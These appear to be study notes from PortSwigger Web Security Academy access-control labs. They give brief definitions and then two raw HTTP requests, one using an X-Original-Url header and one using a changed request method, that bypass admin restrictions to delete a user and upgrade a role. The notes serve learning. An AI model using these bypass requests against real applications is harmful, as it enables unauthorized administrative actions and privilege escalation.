
- **Authenticaton**: Confirms that the users is who they say they are 
- **Session: Management**: Identifies which subsequent HTTP request are being made by the same user.
- **Access Control**: determines whether the user its allowed to carry out the action that they are attempting to perform 




####  Lab: URL-based access control can be circumvented
> Add X-Origin-Url http header
```http
GET /?username=carlos HTTP/2
Host: 0aff002c03801528c887f8c7008600d4.web-security-academy.net
Cookie: session=NtH2EX36IwFu4WEfu7ysxeEnWIOLQQr2
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Dnt: 1
X-Original-Url: /admin/delete
```



#### Lab: Method-based access control can be circumvented


> Log in as a normal user get that request change the request method and done
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0abb00d404c6d0ac8079308400a0008a.web-security-academy.net
Cookie: session=Qs6yrRXBJMDMHmY8JU4ncumzci38KeCQ
```